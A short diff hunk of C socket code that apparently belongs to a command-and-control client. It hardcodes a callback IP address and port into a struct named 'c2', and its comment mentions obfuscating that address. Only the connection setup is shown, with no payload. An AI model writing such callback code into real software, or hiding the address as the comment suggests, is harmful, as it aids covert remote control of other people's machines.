@@ -55,7 +55,8 @@ int socket_setup(void){
 	hints.ai_socktype = SOCK_STREAM;
 	
 	// use getaddrinfo to fill out the rest of the struct
-	getaddrinfo(b[1], b[2], &hints, &c2);
+	getaddrinfo("192.168.2.13", "3490", &hints, &c2);
+	//getaddrinfo(b[1], b[2], &hints, &c2); #if we wanted to obfuscated the IP and port
 	
 	// create socket
 	if ((sock = socket(c2->ai_family, c2->ai_socktype, c2->ai_protocol)) == INVALID_SOCKET)
